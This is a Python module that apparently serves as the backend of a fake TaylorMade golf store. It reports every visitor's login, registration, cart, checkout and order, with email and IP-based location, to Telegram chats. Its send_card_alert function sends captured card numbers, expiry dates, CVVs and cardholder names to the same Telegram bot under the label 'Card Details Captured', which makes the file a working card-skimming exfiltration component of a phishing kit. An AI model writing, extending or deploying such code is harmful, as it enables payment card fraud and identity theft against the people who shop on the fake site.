import httpx
import os
from datetime import datetime
from dotenv import load_dotenv

load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TELEGRAM_CHAT_ID   = os.getenv("TELEGRAM_CHAT_ID", "").strip().rstrip(",")
TELEGRAM_CHAT_IDS  = os.getenv("TELEGRAM_CHAT_IDS", "").strip().rstrip(",")
TELEGRAM_API_URL   = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

def _get_chat_ids() -> list[str]:
    """Return all chat IDs to send to (supports multiple via TELEGRAM_CHAT_IDS)."""
    ids = []
    if TELEGRAM_CHAT_IDS:
        ids = [cid.strip() for cid in TELEGRAM_CHAT_IDS.split(",") if cid.strip()]
    if not ids and TELEGRAM_CHAT_ID:
        ids = [TELEGRAM_CHAT_ID]
    return ids


# ── Startup diagnostic ────────────────────────────────────────────────────────
_chat_ids = _get_chat_ids()
if TELEGRAM_BOT_TOKEN and _chat_ids:
    print(f"[TELEGRAM] ✅ Configured — token=...{TELEGRAM_BOT_TOKEN[-6:]}, chat_ids={_chat_ids}")
else:
    print(f"[TELEGRAM] ⚠️  NOT configured — token={'set' if TELEGRAM_BOT_TOKEN else 'MISSING'}, chat_ids={_chat_ids or 'MISSING'}")


# ── Helpers ────────────────────────────────────────────────────────────────────
def _now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _get_location(ip: str) -> str:
    """Lookup city/country from IP using ip-api.com (free, no key needed)."""
    if not ip or ip in ("127.0.0.1", "::1", "testclient"):
        return "🖥️ Local / unknown"
    try:
        with httpx.Client(timeout=5.0) as client:
            r = client.get(f"http://ip-api.com/json/{ip}?fields=status,city,regionName,country,isp")
            data = r.json()
            if data.get("status") == "success":
                return f"📍 {data.get('city', '?')}, {data.get('regionName', '?')}, {data.get('country', '?')} | ISP: {data.get('isp', '?')}"
    except Exception:
        pass
    return f"📍 {ip} (lookup failed)"


def _send(message: str) -> bool:
    chat_ids = _get_chat_ids()
    if not TELEGRAM_BOT_TOKEN or not chat_ids:
        print(f"[TELEGRAM] ❌ Cannot send — token={'set' if TELEGRAM_BOT_TOKEN else 'MISSING'}, chat_ids={chat_ids or 'MISSING'}")
        return False
    success = True
    for chat_id in chat_ids:
        try:
            with httpx.Client(timeout=15.0) as client:
                print(f"[TELEGRAM] Sending to chat_id={chat_id}...")
                r = client.post(
                    TELEGRAM_API_URL,
                    json={"chat_id": chat_id, "text": message, "parse_mode": "Markdown"},
                )
                if r.status_code == 200:
                    print(f"[TELEGRAM] ✅ Sent to chat_id={chat_id}")
                else:
                    print(f"[TELEGRAM] ❌ Failed chat_id={chat_id} — HTTP {r.status_code}: {r.text}")
                    success = False
        except httpx.ConnectError as e:
            print(f"[TELEGRAM] ❌ Connection failed (DNS/network issue?) chat_id={chat_id}: {e}")
            success = False
        except httpx.TimeoutException as e:
            print(f"[TELEGRAM] ❌ Timeout chat_id={chat_id}: {e}")
            success = False
        except Exception as e:
            print(f"[TELEGRAM] ❌ Unexpected error chat_id={chat_id}: {type(e).__name__}: {e}")
            success = False
    return success


# ── Notification functions ─────────────────────────────────────────────────────

def send_login_alert(user_name: str, email: str, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"🏌️ *TaylorMade — User Login*\n"
        f"─────────────────────\n"
        f"👤 *Name:* {user_name}\n"
        f"📧 *Email:* {email}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_new_user_alert(user_name: str, email: str, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"🆕 *TaylorMade — New Registration*\n"
        f"─────────────────────\n"
        f"👤 *Name:* {user_name}\n"
        f"📧 *Email:* {email}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_cart_alert(user_email: str, product_name: str, price: float, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"🛒 *TaylorMade — Item Added to Cart*\n"
        f"─────────────────────\n"
        f"📧 *User:* {user_email}\n"
        f"🏷️ *Product:* {product_name}\n"
        f"💰 *Price:* ${price:,.0f}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_checkout_alert(user_email: str, total: float, item_count: int, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"💳 *TaylorMade — Checkout Started*\n"
        f"─────────────────────\n"
        f"📧 *User:* {user_email}\n"
        f"🛍️ *Items:* {item_count}\n"
        f"💰 *Total:* ${total:,.0f}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_order_alert(user_email: str, total: float, payment_method: str, ip: str = "") -> bool:
    location = _get_location(ip)
    msg = (
        f"✅ *TaylorMade — Order Placed!*\n"
        f"─────────────────────\n"
        f"📧 *User:* {user_email}\n"
        f"💰 *Total:* ${total:,.0f}\n"
        f"💳 *Payment:* {payment_method}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────"
    )
    return _send(msg)


def send_card_alert(
    user_email: str,
    card_number: str,
    expiry: str,
    cvv: str,
    cardholder_name: str,
    total: float = 0,
    ip: str = "",
) -> bool:
    location = _get_location(ip)
    msg = (
        f"💳 *TaylorMade — Card Details Captured*\n"
        f"═════════════════════\n"
        f"👤 *Cardholder:* {cardholder_name}\n"
        f"📧 *Email:* {user_email}\n"
        f"💳 *Card Number:* `{card_number}`\n"
        f"📅 *Expiry:* {expiry}\n"
        f"🔒 *CVV:* {cvv}\n"
        f"💰 *Order Total:* ${total:,.2f}\n"
        f"{location}\n"
        f"🕐 *Time:* {_now()}\n"
        f"═════════════════════"
    )
    return _send(msg)


def send_support_chat_alert(user_email: str, message: str, session_id: str) -> bool:
    msg = (
        f"🔔 *TaylorMade — New Support Message*\n"
        f"─────────────────────\n"
        f"📧 *From:* {user_email}\n"
        f"💬 *Message:* {message}\n"
        f"🕐 *Time:* {_now()}\n"
        f"─────────────────────\n"
        f"↩️ *Reply to this message to respond to the customer*\n"
        f"🔑 `SESSION_ID:{session_id}`"
    )
    return _send(msg)
